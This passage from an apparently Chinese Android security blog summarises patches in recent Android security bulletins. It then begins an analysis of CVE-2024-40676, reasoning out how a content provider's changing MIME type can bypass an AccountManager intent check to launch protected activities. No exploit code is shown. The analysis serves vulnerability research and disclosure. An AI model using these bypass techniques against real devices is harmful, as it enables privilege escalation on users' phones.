驻留在 map 里？类似之前的 leak value，但在没有另一个能倒退 parcel position 的漏洞的情况下是否能像之前那样利用？从漏洞描述上来看应该是做到了代码执行的CVE-2025-22416 EoP HighChooserActivity 预览 ChooserTarget 的 icon 时先检查是否有权限读取 uri。CVE-2025-22417 EoP HighWindowManager transaction 过程中的 race condition，看的不是很明白。漏洞描述：In finishTransition of Transition.java, there is a possible way to bypass touch filtering restrictions due to a tapjacking/overlay attack. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is needed for exploitation.CVE-2025-22422 EoP HighSystem UI 处理 authentication prompt 时的逻辑 bug，当 top app 和 client app 不一样时说明可能真正请求验证的 app 已经被恶意 app 顶到了后台，用户看见的可能是恶意 app 显示的内容（类似 task hijacking），这个时候需要告知原来的 client 验证失败。但是在使用了 createConfirmDeviceCredentialIntent （会 resolve 到 settings 的 ConfirmDeviceCredentialActivity）而非手动调用 BiometricPrompt 进行验证的情况，此时直接发起验证流程的 client package 是 settings，即使后续 top activity 变成了 settings 的其他 activitiy，这个判断也会认为 top app 并没有改变从而不会取消验证请求。利用这个 bug 应该需要能找到足够具有迷惑性的 activity 所以应该还挺麻烦的？补丁加了一个 top activity 的 class name 检查。相关引用：CVE-2020-27059CVE-2025-22424 EoP HighCVE-2025-22426 EoP Highpm ComputerEngine resolveContentProvider 同时接收 uri 的 authority 和 user id，但调用者可能会把 user id 存储在 authority 内，要把这个 user id 提取出来。不太清楚具体是哪里可能会发生这种情况，感觉挺有意思的CVE-2025-22434 EoP High用户点击键盘上打开系统设置的快捷键时没有检查是否有锁屏就直接打开了设置 app，造成锁屏绕过。CVE-2025-22437 EoP High注意官方公告放错了补丁！！官方公告里放的补丁和 CVE-2024-49728 一致，但是正确的补丁其实是 https://android.googlesource.com/platform/frameworks/base/+/25d6165d462ad8fe83ea8dd254214a420bc1a526其实这个漏洞和 2023 年 11 月公告 CVE-2023-40111 是一样的，当时可能由于兼容性考虑只给 android 14 上了这个 patch，现在可能是觉得不妥当又给 backport 到了 13。CVE-2025-22438 EoP Highinput dispatcher 里的加锁问题，会导致 dispatchEntry 这个变量 UAFCVE-2025-22442 EoP Highwork profile 默认禁用开发者选项，看漏洞描述是能往 profile 里装 appCVE-2024-49722 ID High在系统设置里更换用户头像的时候使用显式 intent 进行图片选择，确保只启动系统自己的头像选择器。（这个问题反反复复修复几遍怎么又来了？之前测试过这里没能测出什么问题，这次只给 15 更新了，可能是新版本又加了什么东西）CVE-2025-22421 ID High通知的 content description （用于无障碍）里不要包含通知内容，否则可能会被读屏软件在没解锁屏幕的时候就读出来CVE-2025-22430 ID HighTrustManager 新增的 isInSignificantPlace 方法需要 ACCESS_FINE_LOCATION 权限。只影响 15CVE-2025-22431 DoS HighAppOpsService 内即使直接调用者可信也不应该直接信任由 proxy app 提供的 proxied attribution tag，改为只在没有 proxy app 或其是系统 app 时才信任SystemCVE-2025-26416 EoP Criticalskia 解码 bmp 图片时的未初始化变量CVE-2025-22423 DoS Criticaldng_sdk 里如果 tag count 非法则提前返回，避免后续崩溃CVE-2024-40653 EoP HighTelecomm 里如果绑定到 ConnectionService 后 15 秒还没有响应就解绑CVE-2024-49720 EoP High通过 role 授予权限时把用户之前对该权限选择的“每次都询问”视为有效的用户决定，不要去覆盖它CVE-2024-49730 EoP Highfuse daemon 内增大 MAX_READ_SIZE，看描述是 oob writeCVE-2025-22418 EoP High系统设置内选择铃声的 intent 指定包名，怀疑跟之前那堆铃声漏洞（CVE-2023-40108、CVE-2023-40132）是一样的CVE-2025-22419 EoP Hightelephony app 多个 activity 添加 flag 防止被悬浮窗覆盖。CVE-2025-22427 EoP Highsettings NotificationAccessConfirmationActivity 错误地将 SYSTEM_FLAG_HIDE_NON_SYSTEM_OVERLAY_WINDOWS 传递给 addFlags （作为一个 system flag 应该使用 addSystemFlags/addPrivateFlags），导致其被错误解释为了 FLAG_SHOW_WHEN_LOCKED 从而显示在了锁屏之上，不解锁就可以授权。CVE-2025-22428 EoP High在我之前那个 CVE-2024-43088 的补丁基础之上把检查 calling package 的权限更换为了检查 calling uid 的权限。不是很懂，猜测是可能有一个 app 在主用户上有跨用户权限但在次用户上没权限的情况？CVE-2025-22432 EoP High此漏洞由我发现并报告。telecomm 内使用了 BIND_ALLOW_BACKGROUND_ACTIVITY_STARTS 来 bind CallRedirectionSevice（其是 BAL 豁免名单之一），所以响应超时了也需要 unbind，否则会导致 BAL bypass。更多内容可见于 https://wrlus.com/android-security/bindservice-error-handle/CVE-2025-22433 EoP HighIntentForwarderActivity 内检查 intent 是否可以被转发到其他 profile 时的逻辑 bug，如果 intent 有 selector 那这个 intent 本身和 selector 都要被检查。CVE-2025-22435 EoP High蓝牙 AVDT 协议实现里增加了一个消息类型检查，防止可能的类型混淆CVE-2025-22439 EoP HighDocumentUI 加载 last accessed stack 记录的 uri 时忘记校验 uri，可以绕过存储限制授权CVE-2024-49728 ID High通过蓝牙发送文件时检查传递的 uri 是否为指向其他用户的 uri。印象中很久以前我是测试过这里的，没利用成功，不知道咋复现的2025-03-01在野利用漏洞：CVE-2024-43093、 CVE-2024-50302懒得放补丁链接了，自己去官方公告里面找吧FrameworkCVE-2024-0032 EoP High去年2月补丁里放过的，限制通过 SAF 访问 /sdcard/Android/data。不知道为啥重新放了一遍。CVE-2024-43093 EoP High跟去年11月补丁的一样，自己去看去年的分析吧，懒得再写一遍了。去年忘了给 12L 更新，重新放一遍。CVE-2025-0078 EoP Highservice manager 注册自己的时候需要打开 requesting sid 从而可以正确检索 caller 的 selinux context。关于 requesting sid 的更多信息见 https://project-zero.issues.chromium.org/issues/42450815 （CVE-2019-2023 及相关的一系列漏洞）CVE-2025-0080 EoP HighPackageInstaller unarchive app 的对话框添加 flag 防止被 overlay。CVE-2024-43090 ID High此漏洞由我发现并报告。去年11月放过的，systemui 里面的 icon 跨用户泄露，当时在 Android 15 上忘了启用相关 flag 导致补丁没生效，所以重新放一遍CVE-2025-0083 ID Hightelecom 内使用 getAuthority() 然后手动解析 @ 字符前面的内容去获取 uri 内的 user id 而非使用 getEncodedUserInfo。从 commit message 内大概可以猜测是把 @ 字符使用 uri encode 的格式来绕过原来的补丁。CVE-2025-0086 ID HighAccountManagerService getAuthToken 校验 Authenticator 返回的 account type，避免读到其他 account 数据。CVE-2024-49740 DoS Hightelephony 限制 VisualVoicemailSmsFilterSettings 必须由默认拨号 app 设置，同时限制其内容的大小System下面有很多一个补丁链接对应多个漏洞的情况，不一一复制粘贴了，看得明白就行CVE-2025-0074 RCE CriticalCVE-2025-22403 RCE Criticalbluetooth sdp sdp_discovery.cc 内两处出错 log 里使用了可能已经被释放掉的指针，造成 UAF。真的能造成 RCE？我持怀疑态度。只影响 15。CVE-2025-0075 RCE Criticalsdp_server.cc log 语句内的 UAF，跟上面一样。只影响 15。CVE-2025-0084 RCE Critical蓝牙 SDP 协议实现中，同一个客户端发起多个连接可能导致 UAFCVE-2025-22408 RCE CriticalCVE-2025-22410 RCE CriticalCVE-2025-22411 RCE CriticalCVE-2025-22412 RCE CriticalCVE-2025-22409 EoP CriticalCVE-2025-22404 EoP HighCVE-2025-22405 EoP HighCVE-2025-22406 EoP HighCVE-2025-22407 ID High跟上面一堆是类似问题，蓝牙 log 内可能使用已经被释放的变量导致 UAF。真的有必要搞这么多 CVE？只影响 15。CVE-2025-0081 DoS Critical解析 jpeg 时如果哈夫曼表为空直接 abortCVE-2023-21125 EoP High蓝牙 btif/src/btif_hh.cc 内的 UAF 问题CVE-2025-0079 EoP High蓝牙 AVCTP/AVDTP 指定 BTA_SEC_ENCRYPT 保证加密传输CVE-2025-0082 ID High补丁跟上面的 CVE-2025-0083 是一样的。CVE-2025-0092 ID HighCVE-2025-0093 ID High蓝牙设备解除绑定时重置短信、通讯录、SIM 权限授权状态CVE-2025-26417 ID High将已经下载好的文件插入进 DownloadProvider （DownloadManager.addCompletedDownload）时，确保路径对应文件的所有者与调用者匹配，否则恶意应用可以通过插入操作产生的 DownloadProvider 的 id 通过 DownloadProvider 的权限访问该文件2025-02-01可能的被在野利用漏洞：CVE-2024-53104，内核中 USB 模块的越界写入FrameworkCVE-2024-49721 EoP High 1见 CVE-2024-49721 InputMethodSubtypeArray 反序列化漏洞分析CVE-2024-49743 EoP High 1 2 3这个漏洞比较复杂，后续会单独发文章解析，敬请期待CVE-2024-49746 EoP High 1 2Parcel::continueWrite 中的 fd 处理问题，看起来是会错误 close 掉不该被关闭的 fd？还加了很多溢出的检查CVE-2025-0097 EoP High 1WindowManagerService transferTouchGesture 中除了校验 token 还需要校验 calling uid 跟 owner uid 相等。只影响 15CVE-2025-0098 EoP High 1TaskFragmentOrganizerController 内会检查 activity 的 pid 与注册 organizer 的时候的 calling pid 是否相等，如果不相等说明不是同一个进程，这个时候不发送 activity token 以避免它泄露。但是这个检查存在缺陷，因为如果 app 进行 binder transact 的时候指定了 FLAG_ONEWAY，说明这是一个异步调用，这个时候被调用者拿到的 calling pid 会是 0，以此可以泄露出 pid 是 0 的 ActivityRecord 的 token。什么时候 ActivityRecord 的 pid 是 0？怀疑是 activity 所属的进程已经退出了的时候。只影响 15。CVE-2025-0099 EoP High 1CompanionDeviceManagerService 新增的 getBackupPayload 和 applyRestoredPayload 这两个函数没有权限检查，应该加上 uid 校验，只允许 system 身份调用。CVE-2023-40133 ID HighCVE-2024-0037 ID High1检查 Autofill 相关的 Slice 中的 Icon URI 是否属于当前用户，避免跨用户泄漏。这个应该是去年就放过一次，不知道为什么又放了一遍CVE-2023-40134 ID HighCVE-2023-40135 ID HighCVE-2023-40136 ID HighCVE-2023-40137 ID HighCVE-2023-40138 ID HighCVE-2023-40139 ID High1检查 Autofill 相关 RemoteViews 中 URI 是否全部属于当前用户，避免跨用户泄漏。这个去年也放过一次，同样搞不懂为什么又放CVE-2025-0100 ID High 1此漏洞由我发现并报告。SystemUI MediaProjectionPermissionActivity 使用 getCallingPackage 获取调用者然后校验其权限，如果是特权应用就跳过确认环节。但是 getCallingPackage 的返回结果实际上可以被伪造，补丁改成了更准确的 getLaunchedFromPackage。这里有一个好玩的点，就是 getCallingPackage 返回的是哪个 app 会收到当前 Activity 返回的结果，所以可以被伪造，但是 SystemUI 需要把 IMediaProjection 返回给调用者然后调用者才能使用它开始录屏，伪造 getCallingPackage 实际上会导致应用收不到返回的 binder 自然也就无法完成后续利用。那么这个看起来触发条件和可用性相悖的漏洞是怎么被利用的呢？这里先卖个关子，读者可以先自己思考思考。CVE-2024-49741 DoS High 1此漏洞由我发现并报告。AppWidgetServiceImpl 中限制一个应用最多可以创建 20 个 host，每个 host 可以拥有 200 个 widget，这个补丁之前是完全没有限制的，所以可能发生超大数据量导致 DoS。PlatformCVE-2025-0094 EoP High 1禁止 work profile 打开多用户管理页面，看漏洞描述是可以移除 work profile？SystemCVE-2025-0091 EoP High 1在 Settings 应用中的账号管理页面里，禁止启动带有 content URI 的 intent。跟 Self-changing Data Type - CVE-2024-40676 漏洞分析 是同一类漏洞，去年那篇文章一直没发就是为了等这个漏洞审核，可惜 duplicate 了 😭CVE-2025-0095 EoP High 1Settings AppTimeSpentPreference 中使用一个只有 Action 的隐式 Intent 启动 Activity，可能会被恶意应用劫持。补丁给这个 intent 加上了 setPackage。CVE-2025-0096 EoP High 1nfc 模块里面有个 malloc 的 size 写小了，只影响 15CVE-2024-49723 ID High 1 2移除 Conscrypt 的 3DES 支持，只给 15 更新了CVE-2024-49729 ID High 1fs_mgr/libdm/dm.cpp 中 redact 掉可能的敏感信息，否则会导致其在 bug report 过程中被 dump 出来，泄漏原始加密密钥。2025-01-01这个月补丁好多，算是解答了上个月的“为什么这么少”的疑问大家新年快乐！一直在等补丁链接，等了一个月还没放，只能先发一个不完整版的了注：本月补丁链接未放出 以下部分补丁来源为手动还原2025/02/24 更新：官方公告里已经放出补丁链接 建议去看官方公告里的；官方公告里移除了 CVE-2023-40108 CVE-2023-40132，不知道为什么FrameworkCVE-2024-49724 EoP High 1AccountManagerService checkKeyIntent 加了个 setComponent 让 intent 变成显式 intent，防止 resolve 到 startActivity 期间某些影响 intent resolve 流程的因素发生改变，导致 TOCTTOU race condition。具体实例：Self-changing Data Type。CVE-2024-49732 EoP High 1CompanionDeviceManagerService 里新增的 enablePermissionsSync disablePermissionsSync getPermissionSyncRequest 三个 API 缺少权限检查，补丁限制只有 system uid 可以调用。只影响 15。CVE-2024-49735 EoP High 1存储 NotificationChannel 的时候，限制附带的 VibrationEffect 的大小。CVE-2024-49737 EoP High 1调用 startActivityInTaskFragment 的时候已经 clearCallingUid 了，之后在 AMS 里构造 SafeActivityOptions 的时候会拿到自己的 uid，改成调用的时候就主动按照已经记录的 calling uid/pid 构造 SafeActivityOptions 再传过去。只影响 13+。看了眼致谢信息，果然是 Michał Bednarski。CVE-2024-49738 EoP High 1Parcel::writeInplace() 在写入数据之前先校验数据。没太看懂咋触发，看描述是越界写。CVE-2024-49744 EoP High 1此漏洞由我发现并报告。AccountManagerService checkKeyIntentParceledCorrectly 里只检查了 intent 的类型，没有检查再次反序列化后 intent 的类型，可以通过 bundle mismatch 的方式绕过。关于绕过了有什么用，可以查看这一篇： https://konata.github.io/posts/creator-mismatch/注：这个漏洞看起来很明显，但实际上并不好利用，ChooseTypeAndAccountActivity 或者 AddAccountSettings 等常见利用点都已经在之前的 CVE-2023-20944 跟 CVE-2023-21124 的补丁里加上了 new Intent 使得我们伪造的 intent 并不会直接传递给 startActivity。那么如何触发这个漏洞呢？这里先留一个悬念，读者可以自己先思考思考。CVE-2024-49745 EoP High 1Parcel::growData 中如果现在的 data position 已经大于 data size 就直接返回。看漏洞描述是越界写。CVE-2023-40108 ID High 1SettingsProvider 中设置铃声的时候校验这个 URI 确实是一个音频文件。追代码可以看见后面会读取这个 URI 把它写进一个 cache dir 里，这里是以 SettingsProvider 的权限去读取，SettingsProvider 跑在 system_server 里所以是 system 权限，然后这个 cache file 可以通过调用 SettingsProvider 的 openFile() 打开，返回一个 InputStream 而不需要任何权限，所以这里是一个以系统权限读取任意 URI。很早就知道的老问题了，属于有生之年系列，最早应该是 CVE-2022-20353 在 Settings 调用铃声选择器的时候加了校验，看代码可以发现 com.android.dialer.app.settings.DefaultRingtonePreference 也有类似问题（这个月的 CVE-2023-40132），而且铃声属于 Settings.System 组，可以被拿到读写系统设置权限的 app 手动触发。这次在根源上修复了，应该不会再有问题了。CVE-2024-49733 ID High 1此漏洞由我发现并报告。Settings 的 ServiceListing 始终显示被启用了的服务，保证用户也能看见有些校验不通过但是已经被启用的服务。感觉类型给错了，应该给 EoP 的Media FrameworkCVE-2023-40132 EoP High 1 2跟上面的 CVE-2023-40108 是一个问题，不再重复解释了。这个补丁比上面那个补丁更早，是在运行在客户端的 RingtoneManager 里也加上文件类型检查，应该是给 com.android.dialer 或者其他 app 的情况用的。上面那个补丁应该也能覆盖这个漏洞的情况。System蓝牙开会了属于是待分析漏洞：CVE-2024-49742 CVE-2024-49734CVE-2024-43096 RCE Critical 1蓝牙 GATT 协议栈 build_read_multi_rsp 函数中 MTU 等于 0 时的越界写入，补丁判断了这种情况直接返回。CVE-2024-43770 RCE CriticalCVE-2024-43771 RCE CriticalCVE-2024-49747 RCE CriticalCVE-2024-49748 RCE Critical1四个漏洞都在 GATT 里，在四个不同的地方都没有检查 gatt_tcb_get_payload_size 的返回值是不是 0，而这个函数在 channel 已经被关闭的时候会返回 0，在后续造成越界写。影响函数：CVE-2024-43770 gatts_process_find_infoCVE-2024-43771 gatts_process_read_reqCVE-2024-49747 gatts_process_read_by_type_reqCVE-2024-49748 gatts_process_primary_service_reqCVE-2024-49749 RCE High 1giflib 解析 gif 的过程中，判断 width 和 height 是否非法的 if 语句存在逻辑错误，变成了只有三项条件全部成立才认为文件非法，应该是三项条件里只要有一项成立就为非法。导致后续计算 size 的时候发生整数溢出进而越界写。CVE-2024-34722 EoP High 1蓝牙配对过程中的授权绕过问题，去年补丁就放过一次，看起来是没修复完CVE-2024-34730 EoP High 1蓝牙 HID 链接过程中的权限绕过问题CVE-2024-43095 EoP High 1改的地方很多，看起来是动态添加的权限相关的自动授权问题In multiple locations, there is a possible way to obtain any system permission due to a logic error in the code. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is needed for exploitation.12345Fix Dynamic Permission group auto grant behaivorFix the Dynamic Permission group auto grant behaivor so that apermission group is only considered granted when (1) all permissionswere auto-granted or (2) a platform permission in the same group isgranted.CVE-2024-43765 EoP High 1悬浮窗覆盖漏洞再次限时回归。Document UI 这个 app 里隐藏遮盖窗体，防止点击劫持。CVE-2024-43763 DoS High 1一个蓝牙的逻辑 bug，应该只会造成功能异常？CVE-2024-49736 DoS High 1禁止在 DSU 模式下恢复出厂设置。可能是因为 DSU 用的 data 不一样，所以不会再要求输入一遍锁屏密码？","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"system","slug":"system","permalink":"https://blog.canyie.top/tags/system/"},{"name":"安全","slug":"安全","permalink":"https://blog.canyie.top/tags/%E5%AE%89%E5%85%A8/"},{"name":"安全补丁分析栏目","slug":"安全补丁分析栏目","permalink":"https://blog.canyie.top/tags/%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90%E6%A0%8F%E7%9B%AE/"}]},{"title":"Self-changing Data Type - CVE-2024-40676 漏洞分析","slug":"self-changing-data-type","date":"2024-11-07T02:00:00.000Z","updated":"2025-04-24T10:33:02.825Z","comments":true,"path":"2024/11/07/self-changing-data-type/","link":"","permalink":"https://blog.canyie.top/2024/11/07/self-changing-data-type/","excerpt":"今年 10 月份的时候，Android 安全公告用 CVE-2024-40676 的编号公布了一个很奇怪的 patch。AccountManagerService checkKeyIntent() 负责检查 account authenticator 传回的 intent，确保它安全再传回给 caller，防止 launch anywhere 漏洞。这个补丁看起来很暴力也很奇怪，直接 ban 了所有带有 content URI 的 intent，似乎完全不考虑兼容性。是什么样的漏洞才要上如此暴力的修复方法？注：如下全是我的猜测，由于联系不到漏洞作者本人，无法确认这是否就是原本的问题。","text":"今年 10 月份的时候，Android 安全公告用 CVE-2024-40676 的编号公布了一个很奇怪的 patch。AccountManagerService checkKeyIntent() 负责检查 account authenticator 传回的 intent，确保它安全再传回给 caller，防止 launch anywhere 漏洞。这个补丁看起来很暴力也很奇怪，直接 ban 了所有带有 content URI 的 intent，似乎完全不考虑兼容性。是什么样的漏洞才要上如此暴力的修复方法？注：如下全是我的猜测，由于联系不到漏洞作者本人，无法确认这是否就是原本的问题。1234567891011121314diff --git a/services/core/java/com/android/server/accounts/AccountManagerService.java b/services/core/java/com/android/server/accounts/AccountManagerService.javaindex b45bcb4..b59a5ea 100644--- a/services/core/java/com/android/server/accounts/AccountManagerService.java+++ b/services/core/java/com/android/server/accounts/AccountManagerService.java@@ -4959,6 +4959,9 @@ if (resolveInfo == null) &#123; return false; &#125;+ if (\"content\".equals(intent.getScheme())) &#123;+ return false;+ &#125; ActivityInfo targetActivityInfo = resolveInfo.activityInfo; int targetUid = targetActivityInfo.applicationInfo.uid; PackageManagerInternal pmi = LocalServices.getService(PackageManagerInternal.class);分析前置知识：launch anywhere 漏洞，这里推荐几篇解析：retme：launchAnyWhere: Activity组件权限绕过漏洞解析(Google Bug 7699048)clang 裁缝店：LaunchAnyWhere 漏洞现世：Google Bug 7699048 复现与分析(Android4.3)读者也可以自己上网搜索。猜想：URI grant？初看这个补丁，虽然提交信息非常谜语人，但很明显它和 content URI 相关，而且很明显这个 intent 最后会被返回给调用者进行 startActivity，很容易能想到的就是 URI grant。然而这个猜想被官方公布的信息否决了，从其他地方拿到了这个漏洞的描述和报告原标题，其中 Summary 是报告标题，Details 是官方给出的漏洞描述：Summary: In AccountManagerService’s checkKeyIntent method there is a possible way to bypass Intent check and lead to LaunchAnyWhere on All Android versionDetails: In checkKeyIntent of AccountManagerService.java, there is a possible way to bypass intent security check and install an unknown app due to a confused deputy. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.虽然仍然是谜语人，但其中出现了 Launch Anywhere 和 install an unknown app 字眼，显然这不可能是单纯的 URI grant 能完成的事。思路自此中断了……吗？抽丝剥茧：影响 resolveActivity 流程？如果你对 AccountManagerService 及 2014 年 Launch Anywhere 漏洞足够熟悉，你应该会知道补丁 checkKeyIntent() 的详细实现。简单来说，它先检查了 Bundle 中的 intent 在反序列化前后一致，然后调用 resolveActivityAsUser() 检查该 intent 指向的 activity 是否能启动，所有检查通过后才会返回 bundle 让调用者进行 startActivity。基于上述漏洞信息，再结合补丁及上下文细节，我们暂时得出如下结论：它能绕过 checkKeyIntent() 里的安全检查从而启动不安全的 activity它需要在 intent 中设置一个 content URI 作为 data 才能实现（废话），而且很可能只需要这一步或者这是最关键的一步，否则不至于上这种暴力补丁很可能不是 bundle mismatch 类问题，理由：作者表示此漏洞能在所有 Android 版本上触发，而我个人想不到应该怎么绕过 Lazy Bundle 及 checkKeyIntentParcelledCorrectly() 两重缓解措施，而且考虑到这个补丁只会在 intent != null 时触发，如果是 bundle mismatch 的话，直接让它在 AccountManagerService 中拿到 null 即可绕过。从这一点我们还可以推出 AccountManagerService 与 caller 拿到的 intent 应该是相同的。基于 3 我们假设这里没有 self-changing Bundle 等技术会影响到 intent 本身，往下推得 AccountManagerService 和 caller 拿到的 intent 相同，那剩下的就只有一点可以怀疑：难道是 AccountManagerService resolveActivity() 到的结果与 caller 实际调用 startActivity 启动的 activity 存在差异？Intent Filter Data Mimetype如果读者有医学相关的经验，应该会知道医学上有个“一元论”，即对于病人的多种症状或现象，首先尝试用单一的一种疾病去解释所有症状，而不是单独片面去看待每个症状将其认为是多个疾病叠加而成。我们这里尝试根据有限的信息去尝试找出问题所在，和医生诊断疾病很像，也可以尝试用这种思维去思考。翻看 startActivity() 的流程，可以发现它解析目标组件也是用的 resolveActivity()，如果说两边存在差异，先基于一元论假设 PackageManagerService resolveActivity() 本身被正确实现没有 bug，那么一定是两个调用中间有什么东西被改变了，即我们说的 TOCTTOU 问题。但是这样我们还是没什么头绪，因为能够影响 intent 解析结果的因素太多了。如果上述情况发生，那么几乎可以肯定这个 intent 一定是一个隐式 intent（显式 intent 连组件名都设置好了，没什么操作余地）；再考虑到补丁中的 content uri data，可以大胆假设，content uri 会影响隐式 intent 解析流程，导致两次解析到不一样的结果。我们知道一个组件只有声明了 intent filter 而且匹配，才有可能被选中为隐式 intent 的目标。翻看 intent filter 的文档，我们可以发现其实它是支持通过 intent data 来匹配的，只需要声明一个 data 标签：123456789&lt;data android:scheme=\"string\" android:host=\"string\" android:port=\"string\" android:path=\"string\" android:pathPattern=\"string\" android:pathPrefix=\"string\" android:pathSuffix=\"string\" android:pathAdvancedPattern=\"string\" android:mimeType=\"string\" /&gt;这里其实还漏了一些属性，比如 android:ssp 这个属性就没提到。里面的大部分属性，比如 scheme、host 这种基本上都是直接从 URI String 中解析出来的，而根据上述的分析，攻击者应该是没法让 data 这个 uri 本身发生改变的（否则直接改掉 scheme 就直接绕过补丁了），所以应该跟本漏洞没多大关联。看起来能搞些名堂的就只有最后的 mimeType 属性？至于什么是 Mime Type 不了解的读者可以自行百度，这里就不赘述了。这里引入了一个很有趣的问题，我们知道对于 file:///sdcard/abc.txt 我们可以一眼看出来它的 mime type 是 text/plain，而对于 content URI，它的值需要调用其指向的 content provider 才能获得，那么它的 type 是怎么拿到的呢？答案很简单：也是调用 content provider 获取。根据官方文档， ContentProvider 有一个专门的 getType() 方法用来返回 mime type。因为它是主动调用我们自己才能得到结果，换句话说也就是结果是通过执行我们自己自定义的代码得到的，这里其实操作空间就很大了。还有一个问题，这个 type 会被实际用在解析流程中吗？答案是肯定的。简单追一下 resolveActivity() 的流程，甚至不用追进 system server 里就能看见:123456789101112@Overridepublic ResolveInfo resolveActivityAsUser(Intent intent, ResolveInfoFlags flags, int userId) &#123; try &#123; return mPM.resolveIntent( intent, intent.resolveTypeIfNeeded(mContext.getContentResolver()), updateFlagsForComponent(flags.getValue(), userId, intent), userId); &#125; catch (RemoteException e) &#123; throw e.rethrowFromSystemServer(); &#125;&#125;123456789101112131415161718192021/** * Return the MIME data type of this intent, only if it will be needed for * intent resolution. This is not generally useful for application code; * it is used by the frameworks for communicating with back-end system * services. * * @param resolver A ContentResolver that can be used to determine the MIME * type of the intent's data. * * @return The MIME type of this intent, or null if it is unknown or not * needed. */public @Nullable String resolveTypeIfNeeded(@NonNull ContentResolver resolver) &#123; // Match logic in PackageManagerService#applyEnforceIntentFilterMatching(...) if (mComponent != null &amp;&amp; (Process.myUid() == Process.ROOT_UID || Process.myUid() == Process.SYSTEM_UID || mComponent.getPackageName().equals(ActivityThread.currentPackageName()))) &#123; return mType; &#125; return resolveType(resolver);&#125;12345678910111213141516171819202122232425/** * Return the MIME data type of this intent. If the type field is * explicitly set, that is simply returned. Otherwise, if the data is set, * the type of that data is returned. If neither fields are set, a null is * returned. * * @param resolver A ContentResolver that can be used to determine the MIME * type of the intent's data. * * @return The MIME type of this intent. * * @see #getType * @see #resolveType(Context) */public @Nullable String resolveType(@NonNull ContentResolver resolver) &#123; if (mType != null) &#123; return mType; &#125; if (mData != null) &#123; if (\"content\".equals(mData.getScheme())) &#123; return resolver.getType(mData); &#125; &#125; return null;&#125;12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/** * Return the MIME type of the given content URL. * * @param url A Uri identifying content (either a list or specific type), * using the content:// scheme. * @return A MIME type for the content, or null if the URL is invalid or the type is unknown */@Overridepublic final @Nullable String getType(@NonNull Uri url) &#123; Objects.requireNonNull(url, \"url\"); try &#123; if (mWrapped != null) return mWrapped.getType(url); &#125; catch (RemoteException e) &#123; return null; &#125; IContentProvider provider = null; try &#123; provider = acquireProvider(url); &#125; catch (Exception e) &#123; // if unable to acquire the provider, then it should try to get the type // using getTypeAnonymous via ActivityManagerService &#125; if (provider != null) &#123; try &#123; final StringResultListener resultListener = new StringResultListener(); provider.getTypeAsync(mContext.getAttributionSource(), url, new RemoteCallback(resultListener)); resultListener.waitForResult(CONTENT_PROVIDER_TIMEOUT_MILLIS); if (resultListener.exception != null) &#123; throw resultListener.exception; &#125; return resultListener.result; &#125; catch (RemoteException e) &#123; // Arbitrary and not worth documenting, as Activity // Manager will kill this process shortly anyway. return null; &#125; catch (java.lang.Exception e) &#123; Log.w(TAG, \"Failed to get type for: \" + url + \" (\" + e.getMessage() + \")\"); return null; &#125; finally &#123; try &#123; releaseProvider(provider); &#125; catch (java.lang.NullPointerException e) &#123; // does nothing, Binder connection already null &#125; &#125; &#125;如果你去看 startActivity 的源码，你会发现这个 resolved type 也会被用到，这里不赘述。也就是说，这个 type 可以影响解析的结果。至此答案就已经呼之欲出了：我们可以在这个 content provider 的 getType() 中动手脚，让其进行安全检查时和实际启动 activity 时得到两个不同的 type，就能绕过检查启动恶意 activity！复现有了如上的分析积累，接下来复现它就是很简单的事。我们已知 AccountManagerService 只允许启动我们 app 自己的 activity （还有两个系统自己的 activity 但是在这个漏洞中完全没用），那么我们需要自己声明一个 activity 让它匹配一个 mime type，然后在 Content Provider 中进行一个简单的计数来决定返回哪个 mime type。很明显，这个漏洞本身只允许我们启动接收隐式 intent 的 activity，那我们能选择攻击什么组件，又能造成多大的危害呢？尝试1：Re-Redirection？首先想到的是，如果我们能通过隐式 intent 启动某个受保护 activity，而这个 activity 又能按我们意图启动其他组件，例如从 extras 里拿到一个 intent 然后直接发送出去，那么我们通过这种二次重定向就能调用到没有声明 intent filter 的组件，大大扩展我们的攻击面。那么有没有这样的 activity 呢？有。Settings 中有一个叫做 SearchResultTrampoline 的 activity，可以通过发送 com.android.settings.SEARCH_RESULT_TRAMPOLINE 启动，其本身会在校验调用者为 Settings 本身后从 extras 取出调用者指定的参数，然后启动任意 activity 或 Settings 内的任意 fragment。更美好的是，这里的入参 intent 甚至也是以一个 URI String 的方式给出，所以即使是我们没法往里面放入 Parcelable 对象的情况也可以利用这个 activity 实现 launch anywhere。12345678910&lt;activity android:name=\".search.SearchResultTrampoline\" android:theme=\"@android:style/Theme.NoDisplay\" android:excludeFromRecents=\"true\" android:knownActivityEmbeddingCerts=\"@array/config_known_host_certs\" android:exported=\"true\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"com.android.settings.SEARCH_RESULT_TRAMPOLINE\" /&gt; &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt; &lt;/intent-filter&gt;&lt;/activity&gt;看起来很美好，是吧？不过这个 intent filter 并没有指定 &lt;data&gt; 标签，这种情况我们能利用吗？一个很自然的思路就是，我们可以通过把 type 设置成 null 的方式来让一个带有 content URI 的隐式 intent 匹配到它吗？很遗憾的是，此路不通。尝试自己声明一个 activity 接收同 action 再加上一个 mimeType 为 application/canyie 的 data 标签，经过实验，type 设置为 application/canyie 时确实可以解析到自己的 activity，但设置为 null 即会触发 ActivityNotFoundException。那还有这样的 activity 吗？还有很多，比如 ChooserActivity 和 ResolverActivity，两者都是 framework 中的自带 activity，会通过 startAsCaller 的方式以调用者的权限发送指定 intent。如果我们能让 system uid 启动这两个 activity，就能再次获得以 system uid 发送任意 intent 的能力。可惜的是，ResolverActivity 并没有声明任何 intent filter，而 ChooserActivity 虽然声明了 android.intent.action.CHOOSER 这个 action，但同样也没有声明 data 标签。其他类似的 activity 也大多是如此情况，我并没有在 AOSP 中找到符合条件的 activity，所以只能放弃这条路。尝试2：CALL_PRIVILEGED？我们已经知道，利用此漏洞只能启动带有 data 标签 intent filter 的 activity。满足这些条件而且本身又要有危害的 activity 很少，复现 Launch Anywhere 类漏洞时我们常用的 PlatLogoActivity 还有重设锁屏密码的页面都没法用这种方法启动。不过我们还常用 android.intent.action.CALL_PRIVILEGED 这个 action 